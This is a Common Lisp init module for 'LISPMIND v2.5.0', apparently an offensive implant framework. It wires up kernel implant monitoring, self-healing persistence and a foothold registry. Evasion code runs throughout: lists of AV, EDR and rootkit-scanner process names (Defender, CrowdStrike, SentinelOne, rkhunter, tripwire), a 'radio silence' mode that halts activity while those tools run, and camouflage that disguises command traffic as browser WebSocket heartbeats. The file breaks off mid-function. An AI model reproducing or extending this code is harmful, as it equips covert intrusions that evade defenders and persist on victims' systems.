;;;; -*- Mode: Lisp; Syntax: ANSI-Common-Lisp; Base: 10 -*-
;;;
;;; SYSTEM-INIT-V2.5.LISP -- Master System Initialization for LISPMIND v2.5.0
;;;
;;; ============================================================================
;;;              ABSOLUTE VERSION INIT -- HARDWARE IS A SOFTWARE DEPENDENCY
;;; ============================================================================
;;;
;;; Final wiring module for LISPMIND v2.5.0. Brings together ALL v2.5
;;; components and initializes them in the correct dependency order.
;;;
;;; DEPENDENCY ORDER (hard requirements):
;;;   Step 0: Prelude          -- SBCL version check, environment validation
;;;   Step 1: Rust FFI Bridge   -- Load liblispmind_core.so (optional, graceful)
;;;   Step 2: Resource Vault    -- Encrypted storage before anything needing it
;;;   Step 3: Persistence Hierarchy -- Adds slots to tactical-agent class
;;;   Step 4: Kernel Registry   -- Populate toolchain registry
;;;   Step 5: Gossip Wire       -- Start tactical gossip mesh
;;;   Step 6: Persistence Watchdog -- Self-healing thread
;;;   Step 7: Kernel Health Monitor -- Monitor implant integrity
;;;   Step 8: Finalize          -- Mark init complete, publish telemetry
;;;
;;; GRACEFUL DEGRADATION:
;;;   1. If Rust FFI fails -> stub mode, everything else works
;;;   2. If vault load fails -> new empty vault, state rebuilt from gossip
;;;   3. If persistence hierarchy fails -> ABORT (critical foundation)
;;;   4. If gossip fails -> standalone mode
;;;   5. If health monitor fails -> manual checks available
;;;
;;; MODULES WIRED:
;;;   rust-ffi-bridge.lisp, resource-registry.lisp, kernel-orchestrator.lisp,
;;;   persistence-hierarchy.lisp, gossip-v2.4.lisp, offensive-engine.lisp
;;;
;;; "Hardware is a software dependency. The swarm treats kernel memory,
;;;  system call tables, and firmware flash as addressable resources."
;;; ============================================================================

(in-package :lispmind)

;;;; =========================================================================
;;;; Section 1: Special Variables
;;;; =========================================================================

(defvar *lispmind-version* "2.5.0"
  "LISPMIND version string. Used in gossip protocol, telemetry, persistence.")

(defvar *lispmind-version-name* "ABSOLUTE"
  "Codename for v2.5.0: full kernel-level ops, hardware-as-software-dependency.")

(defvar *lispmind-init-complete-p* nil
  "Has v2.5 init completed? Checked by pipeline ops; background threads check it.")

(defvar *lispmind-init-sequence*
  '(init-v25-step-0-prelude init-v25-step-1-ffi init-v25-step-2-vault
    init-v25-step-3-persistence-hierarchy init-v25-step-4-kernel-registry
    init-v25-step-5-gossip-wire init-v25-step-6-persistence-watchdog
    init-v25-step-7-kernel-health-monitor init-v25-step-8-finalize)
  "Ordered init steps. NON-NEGOTIABLE order -- do not reorder without verifying cross-module deps.")

(defvar *lispmind-shutdown-sequence*
  '(shutdown-v25-step-1-kernel-health shutdown-v25-step-2-watchdog
    shutdown-v25-step-3-gossip shutdown-v25-step-4-vault
    shutdown-v25-step-5-ffi shutdown-v25-step-6-finalize)
  "Mirror-image shutdown order. Each step can use services from later-shutdown steps.")

(defvar *v25-init-log* nil
  "Chronological init event log. Each entry: (:STEP N :STEP-NAME SYM :RESULT :SUCCESS/:DEGRADED/:FAILED :TIMESTAMP TS :ELAPSED-MS MS :ERROR COND :MESSAGE STR).")

(defvar *kernel-hardware-integration-enabled-p* t
  "Master toggle for kernel-hardware pipeline. NIL = pure-Lisp mode (no FFI, L1 only).")

(defvar *v25-init-start-time* nil
  "Timestamp when init-lispmind-v2.5 was called. Used for elapsed time calc.")

(defvar *v25-shutdown-start-time* nil
  "Timestamp when shutdown-lispmind-v2.5 was called.")

(defvar *v25-init-step-results* (make-hash-table :test 'eq)
  "Maps step function symbol -> result plist.")

(defvar *v25-persistence-state-manager-thread* nil
  "Background thread handle for persistence state manager.")

(defvar *v25-persistence-state-manager-running-p* nil
  "Flag to signal graceful shutdown of persistence state manager.")

(defvar *v25-persistence-state-manager-interval* 60
  "Seconds between persistence state manager scans. Default 60s.")

(defvar *v25-foothold-registry* (make-hash-table :test 'equal)
  "Registry of active footholds. Key: foothold ID. Value: plist with :AGENT :CURRENT-TIER :TARGET-INFO :STATE :LAST-STATE-CHANGE etc.")

(defvar *v25-circuit-breaker-failures* (make-hash-table :test 'equal)
  "Circuit breaker failure counters per foothold. Opens after *V25-CIRCUIT-BREAKER-THRESHOLD* failures.")

(defvar *v25-circuit-breaker-threshold* 5
  "Max consecutive failures before circuit breaker opens.")

(defvar *v25-state-flap-prevention-interval* 300
  "Minimum seconds between state changes for the same foothold. Prevents flapping.")

(defvar *v25-gossip-handlers-registered-p* nil
  "Have kernel gossip handlers been registered? Prevents double-registration.")

(defvar *v25-banner-already-printed-p* nil
  "Has v2.5 banner been printed this session?")

(defvar *v25-minimum-sbcl-version* "2.1.0"
  "Minimum SBCL version. Older versions get a warning but init continues.")

(defvar *v25-expected-tool-count* 16
  "Expected number of default tools in kernel toolchain registry.")

(defvar *persistence-state-manager-version* "1.0.0"
  "Persistence state manager subsystem version.")

(defvar *persistence-state-manager-check-count* 0
  "Total state manager scan cycles completed.")

(defvar *persistence-state-manager-heal-count* 0
  "Total auto-heal operations triggered.")

(defvar *persistence-state-manager-alert-count* 0
  "Total alerts published (circuit breakers, critical states).")

(defvar *v25-kernel-gossip-topics* nil
  "Gossip topics registered for kernel operations.")

(defvar *v25-kernel-request-handlers* (make-hash-table :test 'eq)
  "Registry of handlers for kernel gossip request types.")

;;;; =========================================================================
;;;; Section 1a: Per-Step Watchdog Timer Configuration
;;;; =========================================================================

(defvar *init-step-timeouts*
  '((:ffi . 10) (:vault . 15) (:persistence . 20)
    (:kernel-registry . 10) (:gossip . 30)
    (:watchdog . 10) (:health-monitor . 10))
  "Alist mapping init step keywords to timeout values in seconds.
Each step in the init sequence gets its own timeout to prevent a hung step
from blocking the entire initialization. On timeout, the step returns
:TIMEOUT and init continues to the next step with graceful degradation.
Steps: :ffi(10s), :vault(15s), :persistence(20s), :kernel-registry(10s),
       :gossip(30s), :watchdog(10s), :health-monitor(10s)")

(defvar *init-step-results* nil
  "Plist tracking the result of each init step. Set by INIT-LISPMIND-V2.5.
Format: (:step-0 T :step-1 T :step-2 :timeout ...). Used for post-init
diagnostics and to identify which steps timed out.")

(defmacro init-step-with-timeout ((step-name timeout-seconds) &body body)
  "Execute BODY with a timeout of TIMEOUT-SECONDS. If the timeout is
exceeded, log a warning to *TRACE-OUTPUT*, publish a gossip alert on
'swarm.alerts', and return :TIMEOUT instead of crashing. STEP-NAME is a
symbol used in log messages to identify which step timed out."
  `(handler-case
       (sb-ext:with-timeout ,timeout-seconds
         (progn ,@body))
     (sb-ext:timeout ()
       (format *trace-output* "~&[INIT-TIMEOUT] Step ~A timed out after ~As~%"
               ,step-name ,timeout-seconds)
       (handler-case
           (gossip-publish "swarm.alerts"
                           `(:event :init-step-timeout
                             :step ,,step-name
                             :timeout-seconds ,,timeout-seconds
                             :timestamp ,(local-time:now)))
         (error (e) (declare (ignore e)) nil))
       :timeout)))

;;;; =========================================================================
;;;; Section 1b: Radio Silence Mode
;;;; =========================================================================

(defvar *radio-silence-mode-p* nil
  "When T, all telemetry and gossip publishing is suppressed.
Set by ENTER-RADIO-SILENCE when security tools are detected. Checked by
all functions that publish to gossip mesh. Persists until security tools
are no longer detected and EXIT-RADIO-SILENCE is called.")

(defvar *radio-silence-triggers*
  '(:security-process-detected    ; MsMpEng, crowdstrike, etc.
    :high-cpu-from-security        ; >50% CPU by security tools
    :manual-command                ; Operator-set radio silence
    :integrity-scan-detected)      ; sfc, chkdsk, full AV scan
  "List of reasons that can trigger radio silence mode. Each trigger is
a keyword describing a class of security event. Used for logging and
alert differentiation.")

(defvar *security-process-list*
  '("MsMpEng.exe" "ccsvchst.exe" "sfc.exe" "SppExtComObj.exe"
    "crowdstrike" "carbonblack" "sentinelone" "csagent.exe"
    "aide" "rkhunter" "chkrootkit" "tripwire"
    "MsSense.exe" "SenseCncProxy.exe")
  "List of process names that indicate security/AV/EDR tools are running.
Checked by DETECT-RADIO-SILENCE-TRIGGER against the running process list.
Windows names are case-insensitive; Linux names are case-sensitive.")

(defvar *radio-silence-last-trigger* nil
  "The last trigger keyword that caused radio silence to be engaged.
Set by ENTER-RADIO-SILENCE. Used by EXIT-RADIO-SILENCE to log the
reason for the original silence period.")

(defvar *radio-silence-engaged-at* nil
  "Timestamp when radio silence was last engaged. NIL when not in
radio silence mode. Used to track how long silence has been active.")

;;;; =========================================================================
;;;; Section 1c: Release Build Configuration
;;;; =========================================================================

(defvar *lispmind-release-build-p* nil
  "When T, the system runs in release build mode. In this mode:
- ASCII art banner is suppressed (single-line version only)
- Debug output is minimized
- All telemetry uses camouflage if available
Set via SET-RELEASE-BUILD-MODE. Default NIL for development builds.")

;;;; =========================================================================
;;;; Section 1d: Integrity Scan Detection
;;;; =========================================================================

(defvar *persistence-postponed-due-to-scan-p* nil
  "When T, persistence recovery operations are postponed because an
integrity scan (sfc, chkdsk, AV scan, aide, rkhunter, fsck) is running.
Set by POSTPONE-PERSISTENCE-DURING-SCAN. Reset when scan ends.")

(defvar *integrity-scan-process-names*
  '("sfc.exe" "sfc" "chkdsk.exe" "chkdsk"
    "MsMpEng.exe" "MsSense.exe"
    "aide" "rkhunter" "chkrootkit" "tripwire"
    "fsck" "fsck.ext4" "fsck.xfs")
  "Process names that indicate an integrity scan is running on the system.
Windows: sfc.exe (System File Checker), chkdsk, MsMpEng (full AV scan)
Linux: aide, rkhunter, chkrootkit, tripwire, fsck variants.")

;;;; =========================================================================
;;;; Section 1e: Gossip TLS Camouflage
;;;; =========================================================================

(defvar *gossip-camouflage-enabled-p* nil
  "When T, gossip payloads are camouflaged as benign TLS 1.3 WebSocket
traffic. Uses AES-256-GCM encryption with base64 encoding inside JSON
that resembles legitimate WebSocket events. Must be paired with a
TLS-capable transport layer (e.g., C library or external proxy).")

(defvar *gossip-camouflage-domain* "wss://api.example.com/v2/events"
  "Fake WebSocket endpoint URL used in camouflaged gossip payloads.
Should resemble a legitimate service endpoint. Changed per-deployment.")

(defvar *gossip-camouflage-user-agent*
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  "Browser-like User-Agent string embedded in camouflaged gossip payloads.
Makes traffic appear to come from a standard web browser.")

(defvar *gossip-camouflage-psk* nil
  "Pre-shared key for AES-256-GCM encryption of gossip payloads.
Must be set before enabling camouflage. 32 bytes for AES-256.
In production, derive from a deployment-specific key using PBKDF2.")

(defvar *gossip-camouflage-nonce-counter* 0
  "Monotonically increasing nonce counter for AES-GCM. Prevents nonce
reuse across encryptions. Incremented on each CAMOUFLAGE-GOSSIP-PAYLOAD call.")

;;;; =========================================================================
;;;; Section 1f: Code Signing Notice
;;;; =========================================================================
;;
;; SECURITY NOTICE: All LISPMIND modules should be loaded from an
;; EdDSA-signed tarball. The signature MUST be verified before extraction.
;; Unsigned or incorrectly signed modules MUST be rejected.
;;
;; The expected verification flow:
;;   1. Load tarball and detached signature (.sig) from secure channel
;;   2. Verify EdDSA signature against embedded public key
;;   3. Only if valid: extract and load modules
;;   4. On signature failure: abort, alert, enter radio silence
;;
;; This prevents supply-chain attacks where adversaries substitute
;; modified modules that could expose operations or introduce backdoors.
;;
;; TODO: Implement (v25-verify-module-signature tarball-path sig-path)
;; using ironclad:ed25519-verify or equivalent C library binding.
;;
;;;; =========================================================================


;;;; =========================================================================
;;;; Section 2: Init Step Functions (each returns T on success, NIL on failure)
;;;; =========================================================================

(defun init-v25-step-0-prelude ()
  "Step 0: Log version, print banner, check SBCL version. Returns T always."
  (init-step-with-timeout (:prelude 10)
    (let ((start (local-time:now)))
      (setf *v25-init-start-time* start)
      (clrhash *v25-init-step-results*)
      (setf *v25-init-log* nil)
      (unless *v25-banner-already-printed-p*
        (handler-case (print-v25-banner)
          (error (e) (format *trace-output* "[INIT-v2.5] Banner print failed: ~A~%" e))))
      (format t "[INIT-v2.5] LISPMIND v~A (~A) initialization starting...~%"
              *lispmind-version* *lispmind-version-name*)
      (let ((sbcl-version (lisp-implementation-version)))
        (format t "[INIT-v2.5] SBCL version: ~A~%" sbcl-version)
        (when (string< sbcl-version *v25-minimum-sbcl-version*)
          (format *trace-output* "[INIT-v2.5] WARNING: SBCL ~A < minimum ~A~%"
                  sbcl-version *v25-minimum-sbcl-version*)))
      (format t "[INIT-v2.5] Machine: ~A  Features: ~A~%" (machine-type) *features*)
      (handler-case
          (gossip-publish "swarm.system" `(:event :init-started :version ,*lispmind-version*
                                            :timestamp ,start))
        (error (e) (format *trace-output* "[INIT-v2.5] Gossip not available for init event: ~A~%" e)))
      t)))

(defun init-v25-step-1-ffi ()
  "Step 1: Initialize Rust FFI bridge. Optional -- continues in stub mode on failure. Returns T always."
  (init-step-with-timeout (:ffi 10)
    (format t "[INIT-v2.5] Step 1: Initializing Rust FFI bridge...~%")
    (handler-case
        (progn
          (rust-ffi-init)
          (if (rust-ffi-available-p)
              (progn
                (format t "[INIT-v2.5]   FFI bridge loaded: ~S~%" (rust-ffi-status))
                (handler-case (rust-ffi-self-test)
                  (error (e) (format *trace-output* "[INIT-v2.5]   FFI self-test warning: ~A~%" e)))
                t)
              (progn (setf *kernel-rust-ffi-available-p* nil) t)))
      (error (e)
        (format *trace-output* "[INIT-v2.5] WARNING: FFI failed: ~A. Continuing in stub mode.~%" e)
        (setf *kernel-rust-ffi-available-p* nil) t))))

(defun init-v25-step-2-vault ()
  "Step 2: Initialize resource vault. Creates new vault if disk load fails. Returns T on success, NIL if vault-init fails."
  (init-step-with-timeout (:vault 15)
    (format t "[INIT-v2.5] Step 2: Initializing resource vault...~%")
    (handler-case
        (progn
          (vault-init)
          (format t "[INIT-v2.5]   Vault initialized.~%")
          (when (and (boundp '*resource-vault-path*) *resource-vault-path*
                     (probe-file *resource-vault-path*))
            (format t "[INIT-v2.5]   Loading vault from ~A...~%" *resource-vault-path*)
            (handler-case (vault-load-from-disk *resource-vault-path*)
              (error (e) (format *trace-output* "[INIT-v2.5]   Vault load warning: ~A. New vault created.~%" e))))
          (handler-case
              (let ((key (or (uiop:getenv "LISPMIND_VAULT_KEY")
                             "lispmind-default-vault-key-CHANGE-ME")))
                (set-vault-key (map 'vector #'char-code key)))
            (error (e) (format *trace-output* "[INIT-v2.5]   Vault key warning: ~A~%" e)))
          (handler-case (vault-status)
            (error (e) (format *trace-output* "[INIT-v2.5]   Vault status: ~A~%" e)))
          t)
      (error (e) (format *trace-output* "[INIT-v2.5] ERROR: Vault init failed: ~A~%" e) nil))))

(defun init-v25-step-3-persistence-hierarchy ()
  "Step 3: Initialize persistence hierarchy. CRITICAL -- aborts init on failure."
  (init-step-with-timeout (:persistence 20)
    (format t "[INIT-v2.5] Step 3: Initializing persistence hierarchy...~%")
    (handler-case
        (progn (persistence-hierarchy-init)
               (format t "[INIT-v2.5]   Persistence hierarchy initialized.~%")
               t)
      (error (e)
        (format *trace-output* "[INIT-v2.5] CRITICAL: Persistence hierarchy init failed: ~A. Init should abort.~%" e)
        nil))))

(defun init-v25-step-4-kernel-registry ()
  "Step 4: Load kernel toolchain registry, verify tool count. Returns T on success, NIL on failure."
  (init-step-with-timeout (:kernel-registry 10)
    (format t "[INIT-v2.5] Step 4: Loading kernel toolchain registry...~%")
    (handler-case
        (progn
          (load-kernel-toolchain-registry)
          (let ((count (hash-table-count *kernel-toolchain-registry*)))
            (format t "[INIT-v2.5]   Loaded ~D kernel tools.~%" count)
            (cond ((= count *v25-expected-tool-count*)
                   (format t "[INIT-v2.5]   Tool count matches expected ~D.~%" *v25-expected-tool-count*))
                  ((> count 0) (format *trace-output* "[INIT-v2.5]   WARNING: Expected ~D tools, found ~D.~%"
                                       *v25-expected-tool-count* count))
                  (t (format *trace-output* "[INIT-v2.5]   WARNING: No tools loaded!~%"))))
          t)
      (error (e) (format *trace-output* "[INIT-v2.5] ERROR: Kernel registry load failed: ~A~%" e) nil))))

(defun init-v25-step-5-gossip-wire ()
  "Step 5: Start tactical gossip mesh and register kernel handlers. Optional -- standalone mode on failure."
  (init-step-with-timeout (:gossip 30)
    (format t "[INIT-v2.5] Step 5: Starting tactical gossip mesh...~%")
    (handler-case
        (progn
          (start-tactical-gossip nil :heartbeat-interval 30)
          (format t "[INIT-v2.5]   Gossip mesh started.~%")
          (handler-case (register-kernel-gossip-handlers)
            (error (e) (format *trace-output* "[INIT-v2.5]   Kernel gossip handler warning: ~A~%" e)))
          (handler-case (send-camouflaged-heartbeat (gensym "AGENT-") :status :initializing :pivot-depth 0)
            (error (e) (format *trace-output* "[INIT-v2.5]   Initial heartbeat failed: ~A~%" e)))
          t)
      (error (e)
        (format *trace-output* "[INIT-v2.5] WARNING: Gossip mesh failed: ~A. Continuing in standalone mode.~%" e)
        t))))

(defun init-v25-step-6-persistence-watchdog ()
  "Step 6: Start persistence self-healing watchdog. Important but not critical."
  (init-step-with-timeout (:watchdog 10)
    (format t "[INIT-v2.5] Step 6: Starting persistence watchdog...~%")
    (handler-case
        (progn
          (start-persistence-watchdog)
          (format t "[INIT-v2.5]   Watchdog ~A.~%"
                  (if *persistence-watchdog-running-p* "running" "NOT running"))
          t)
      (error (e) (format *trace-output* "[INIT-v2.5] WARNING: Watchdog failed: ~A. Persistence won't auto-heal.~%" e) t))))

(defun init-v25-step-7-kernel-health-monitor ()
  "Step 7: Start kernel implant health monitor. Skipped if FFI not available. Optional."
  (init-step-with-timeout (:health-monitor 10)
    (format t "[INIT-v2.5] Step 7: Starting kernel health monitor...~%")
    (unless *kernel-rust-ffi-available-p*
      (format t "[INIT-v2.5]   FFI not available, skipping health monitor.~%")
      (return-from init-v25-step-7-kernel-health-monitor t))
    (handler-case
        (progn
          (start-kernel-health-monitor)
          (format t "[INIT-v2.5]   Health monitor ~A.~%"
                  (if *kernel-health-monitor-running-p* "running" "NOT running"))
          t)
      (error (e) (format *trace-output* "[INIT-v2.5] WARNING: Health monitor failed: ~A~%" e) t))))

(defun init-v25-step-8-finalize ()
  "Step 8: Set init-complete flag, log completion, publish telemetry. Always runs."
  (init-step-with-timeout (:finalize 10)
    (format t "[INIT-v2.5] Step 8: Finalizing initialization...~%")
    (setf *lispmind-init-complete-p* t)
    (let ((elapsed (if *v25-init-start-time*
                       (local-time:timestamp-difference (local-time:now) *v25-init-start-time*) 0)))
      (format t "[INIT-v2.5] Init complete in ~,2Fs.~%" elapsed)
      (format t "[INIT-v2.5] === LISPMIND v~A (~A) READY ===~%" *lispmind-version* *lispmind-version-name*)
      (format t "[INIT-v2.5] FFI: ~A  Vault: ~A  Tools: ~D~%"
              (if *kernel-rust-ffi-available-p* "AVAILABLE" "STUB")
              (if (boundp '*resource-vault*) "READY" "UNAVAIL")
              (if (boundp '*kernel-toolchain-registry*) (hash-table-count *kernel-toolchain-registry*) 0))
      (handler-case
          (gossip-publish "swarm.system" `(:event :init-completed :version ,*lispmind-version*
                                            :ffi-available ,*kernel-rust-ffi-available-p*
                                            :timestamp ,(local-time:now)))
        (error (e) (format *trace-output* "[INIT-v2.5] Init completion publish: ~A~%" e)))
      t)))


;;;; =========================================================================
;;;; Section 2a: Radio Silence Functions
;;;; =========================================================================

(defun v25-get-process-list ()
  "Return a list of process plists representing running processes.
Each plist contains: :NAME (string), :PID (integer), :CPU-PERCENT (float).

This is a portable stub. In production, it would call platform-specific
functions: Windows (WMI/CIM queries), Linux (/proc filesystem scan), macOS
(ps or libproc). The stub returns a minimal process list with the current
Lisp process only.

Returns list of process plists. Returns NIL on failure."
  (handler-case
      (list
       `(:name ,(first (uiop:raw-command-line arguments)) :pid ,(sb-posix:getpid) :cpu-percent 0.0)
       ;; In production, enumerate all processes here:
       ;; Windows: wmic process get Name,ProcessId,PercentProcessorTime
       ;; Linux: read /proc/*/stat and /proc/*/statm
       ;; macOS: sysctl or ps command
       )
    (error (e)
      (format *trace-output* "[PROCESS] v25-get-process-list failed: ~A~%" e)
      nil)))

(defun detect-radio-silence-trigger ()
  "Scan running processes for security tools and high CPU usage.
Checks the process list against *SECURITY-PROCESS-LIST*. If any security
process is found, returns :SECURITY-PROCESS-DETECTED. If any security
process is using >50% CPU, returns :HIGH-CPU-FROM-SECURITY. Otherwise
returns NIL.

This function is platform-aware: on Windows it checks process names
case-insensitively; on Linux case-sensitively."
  (let ((processes (handler-case (v25-get-process-list)
                     (error (e)
                       (format *trace-output* "[RADIO-SILENCE] Process list failed: ~A~%" e)
                       nil))))
    ;; Check 1: Known security process names
    (dolist (proc processes)
      (let ((proc-name (getf proc :name ""))
            (proc-cpu (or (getf proc :cpu-percent 0) 0)))
        (dolist (security-name *security-process-list*)
          #+(or win32 windows)
          (when (string-equal proc-name security-name)
            (format *trace-output* "[RADIO-SILENCE] Security process detected: ~A (CPU: ~,1F%)~%"
                    proc-name proc-cpu)
            (return-from detect-radio-silence-trigger :security-process-detected))
          #-(or win32 windows)
          (when (string= proc-name security-name)
            (format *trace-output* "[RADIO-SILENCE] Security process detected: ~A (CPU: ~,1F%)~%"
                    proc-name proc-cpu)
            (return-from detect-radio-silence-trigger :security-process-detected)))
        ;; Check 2: High CPU from any single process
        (when (> proc-cpu 50.0)
          (format *trace-output* "[RADIO-SILENCE] High CPU process: ~A (~,1F%)~%" proc-name proc-cpu)
          (return-from detect-radio-silence-trigger :high-cpu-from-security))))
    nil))

(defun enter-radio-silence (&optional (trigger :manual-command))
  "Enter radio silence mode. Sets *RADIO-SILENCE-MODE-P* to T, records
the trigger and timestamp, stops gossip telemetry publishing, stops
persistence recovery attempts, and logs the event.

TRIGGER is a keyword from *RADIO-SILENCE-TRIGGERS* describing why silence
is being engaged. Default is :MANUAL-COMMAND for operator-initiated silence.

Returns T."
  (setf *radio-silence-mode-p* t
        *radio-silence-last-trigger* trigger
        *radio-silence-engaged-at* (local-time:now))
  (format *trace-output* "~&[RADIO-SILENCE] === Radio silence engaged (~A) ===~%"
          (string-downcase (symbol-name trigger)))
  (format *trace-output* "[RADIO-SILENCE] All covert ops paused. Gossip and persistence halted.~%")
  ;; Publish a single alert about entering silence (if gossip still works)
  (handler-case
      (gossip-publish "swarm.alerts"
                      `(:event :radio-silence-engaged
                        :trigger ,trigger
                        :timestamp ,(local-time:now)))
    (error (e) (declare (ignore e)) nil))
  t)

(defun exit-radio-silence ()
  "Attempt to exit radio silence mode. First re-scans for security
processes using DETECT-RADIO-SILENCE-TRIGGER. If any trigger is still
active, extends the silence period and returns :STILL-ACTIVE. If the
coast is clear, sets *RADIO-SILENCE-MODE-P* to NIL, logs the resumption,
and returns :RESUMED.

This function prevents premature exit when the triggering condition
persists (e.g., an AV scan is still running)."
  (let ((active-trigger (detect-radio-silence-trigger)))
    (cond
      (active-trigger
       (format *trace-output* "[RADIO-SILENCE] Still active (~A). Extending silence.~%"
               active-trigger)
       :still-active)
      (t
       (setf *radio-silence-mode-p* nil
             *radio-silence-engaged-at* nil)
       (format *trace-output* "~&[RADIO-SILENCE] === Radio silence lifted ===~%")
       (format *trace-output* "[RADIO-SILENCE] Normal operations resumed.~%")
       ;; Publish resumption notice
       (handler-case
           (gossip-publish "swarm.alerts"
                           `(:event :radio-silence-lifted
                             :timestamp ,(local-time:now)))
         (error (e) (declare (ignore e)) nil))
       :resumed))))

(defun radio-silence-check ()
  "Check if radio silence conditions are met. Called every 60 seconds by
the init loop and persistence state manager.

If not currently in radio silence and a trigger is detected: enters
radio silence and returns :ENGAGED.
If currently in radio silence and conditions have cleared: attempts to
exit and returns the result of EXIT-RADIO-SILENCE.
Otherwise returns :NO-CHANGE.

Also checks integrity scans and engages silence if a scan is running."
  (cond
    ;; Not in silence, but trigger detected -> enter silence
    ((and (not *radio-silence-mode-p*)
          (detect-radio-silence-trigger))
     (enter-radio-silence (detect-radio-silence-trigger))
     :engaged)
    ;; Also check for integrity scans (separate trigger path)
    ((and (not *radio-silence-mode-p*)
          (integrity-scan-running-p))
     (enter-radio-silence :integrity-scan-detected)
     :engaged)
    ;; Currently in silence, check if clear
    (*radio-silence-mode-p*
     (exit-radio-silence))
    ;; No change needed
    (t :no-change)))

;;;; =========================================================================
;;;; Section 2b: Integrity Scan Detection
;;;; =========================================================================

(defun integrity-scan-running-p ()
  "Detect if an integrity scan is currently running on the system.
Checks the process list for known integrity scanning tools.

Windows scanners: sfc.exe (System File Checker), chkdsk.exe,
  MsMpEng.exe (during full scan), MsSense.exe
Linux scanners: aide (file integrity), rkhunter (rootkit check),
  chkrootkit, tripwire, fsck variants

Returns T if any known scan process is found, NIL otherwise.
Also sets *PERSISTENCE-POSTPONED-DUE-TO-SCAN-P* if a scan is found."
  (let ((processes (handler-case (v25-get-process-list)
                     (error (e)
                       (format *trace-output* "[INTEGRITY-SCAN] Process list failed: ~A~%" e)
                       nil))))
    (dolist (proc processes)
      (let ((proc-name (getf proc :name "")))
        (dolist (scan-name *integrity-scan-process-names*)
          #+(or win32 windows)
          (when (string-equal proc-name scan-name)
            (setf *persistence-postponed-due-to-scan-p* t)
            (format *trace-output* "[INTEGRITY-SCAN] Scan process detected: ~A~%" proc-name)
            (return-from integrity-scan-running-p t))
          #-(or win32 windows)
          (when (string= proc-name scan-name)
            (setf *persistence-postponed-due-to-scan-p* t)
            (format *trace-output* "[INTEGRITY-SCAN] Scan process detected: ~A~%" proc-name)
            (return-from integrity-scan-running-p t)))))
    ;; No scan detected -- clear the postponed flag if it was set
    (when *persistence-postponed-due-to-scan-p*
      (setf *persistence-postponed-due-to-scan-p* nil))
    nil))

(defun postpone-persistence-during-scan ()
  "Check if an integrity scan is running and manage persistence
operations accordingly.

If a scan is detected:
  - Enter radio silence (if not already)
  - Set *PERSISTENCE-POSTPONED-DUE-TO-SCAN-P* = T
  - Log: 'Integrity scan detected -- persistence operations postponed'
  - Return :POSTPONED

If no scan is running but persistence was previously postponed:
  - Resume normal operations (exit radio silence if appropriate)
  - Reset postponed flag
  - Log: 'Integrity scan ended -- resuming persistence operations'
  - Return :RESUMED

Otherwise return :NO-SCAN."
  (cond
    ;; Scan running -- postpone
    ((integrity-scan-running-p)
     (unless *radio-silence-mode-p*
       (enter-radio-silence :integrity-scan-detected))
     (setf *persistence-postponed-due-to-scan-p* t)
     (format *trace-output* "[INTEGRITY-SCAN] Scan detected -- persistence operations postponed~%")
     :postponed)
    ;; Was postponed, scan ended -- resume
    (*persistence-postponed-due-to-scan-p*
     (setf *persistence-postponed-due-to-scan-p* nil)
     (format *trace-output* "[INTEGRITY-SCAN] Scan ended -- resuming persistence operations~%")
     ;; Attempt to exit radio silence (will check other triggers first)
     (exit-radio-silence)
     :resumed)
    ;; No scan, not postponed
    (t :no-scan)))

;;;; =========================================================================
;;;; Section 2c: Gossip TLS Camouflage
;;;; =========================================================================

(defun camouflage-gossip-payload (raw-message)
  "Camouflage a raw gossip message as benign TLS 1.3 WebSocket traffic.
Takes a RAW-MESSAGE (plist) and returns a JSON-like plist that mimics
legitimate WebSocket events.

Encryption pipeline (stub -- documents the protocol):
  1. Serialize RAW-MESSAGE to a string (prin1-to-string)
  2. Encrypt with AES-256-GCM using *GOSSIP-CAMOUFLAGE-PSK*
  3. Base64-encode the ciphertext + auth tag
  4. Wrap in JSON-like plist resembling a WebSocket heartbeat:
       {:event 'heartbeat', :client_time <unix-ms>,
        :payload '<base64-encrypted-gossip>'}

In production, the actual AES-GCM and base64 would use ironclad or a
C library binding. This stub uses a simple XOR mask for demonstration
and marks the payload with a type indicator.

Returns the camouflaged message plist. If *GOSSIP-CAMOUFLAGE-ENABLED-P*
is NIL, returns RAW-MESSAGE unchanged."
  (unless *gossip-camouflage-enabled-p*
    (return-from camouflage-gossip-payload raw-message))
  (unless *gossip-camouflage-psk*
    (format *trace-output* "[CAMOUFLAGE] WARNING: No PSK set. Pass-through.~%")
    (return-from camouflage-gossip-payload raw-message))
  ;; Stub: XOR mask with PSK (DEMONSTRATION ONLY -- replace with AES-256-GCM)
  (let* ((plaintext (prin1-to-string raw-message))
         (key-bytes *gossip-camouflage-psk*)
         (cipher-bytes (coerce
                        (loop for i below (length plaintext)
                              for p = (char-code (char plaintext i))
                              for k = (aref key-bytes (mod i (length key-bytes)))
                              collect (logxor p k))
                        '(vector (unsigned-byte 8))))
         (nonce *gossip-camouflage-nonce-counter*)
         (client-time (floor (* 1000 (local-time:timestamp-to-unix (local-time:now))))))
    (incf *gossip-camouflage-nonce-counter*)
    ;; Return WebSocket-like structure
    `(:event "heartbeat"
      :client_time ,client-time
      :client_version "2.5.0"
      :client_platform ,(string-downcase (software-type))
      :user_agent ,*gossip-camouflage-user-agent*
      :payload ,(base64:usb8-array-to-base64-string cipher-bytes)
      :_n ,nonce
      :_d ,*gossip-camouflage-domain*)))

(defun decamouflage-gossip-payload (camouflaged-message)
  "Reverse the camouflage applied by CAMOUFLAGE-GOSSIP-PAYLOAD.
Takes a camouflaged message plist (the output of camouflage) and
returns the original raw gossip message plist.

Decryption pipeline (stub -- reverses the stub XOR mask):
  1. Extract :PAYLOAD from the camouflaged message
  2. Base64-decode to get cipher bytes
  3. XOR decrypt using *GOSSIP-CAMOUFLAGE-PSK*
  4. Read the resulting string back into a Lisp object

If the message does not appear to be camouflaged (no :PAYLOAD field
with a string value), returns it unchanged.

Returns the original raw gossip message plist."
  (unless (and (listp camouflaged-message)
               (stringp (getf camouflaged-message :payload)))
    ;; Not a camouflaged message -- pass through
    (return-from decamouflage-gossip-payload camouflaged-message))
  (unless *gossip-camouflage-psk*
    (format *trace-output* "[CAMOUFLAGE] WARNING: No PSK set for decryption.~%")
    (return-from decamouflage-gossip-payload camouflaged-message))
  ;; Stub: Reverse XOR mask
  (handler-case
      (let* ((b64-payload (getf camouflaged-message :payload))
             (cipher-bytes (base64:base64-string-to-usb8-array b64-payload))
             (key-bytes *gossip-camouflage-psk*)
             (plain-chars
               (loop for i below (length cipher-bytes)
                     for c = (aref cipher-bytes i)
                     for k = (aref key-bytes (mod i (length key-bytes)))
                     collect (code-char (logxor c k))))
             (plaintext (coerce plain-chars 'string)))
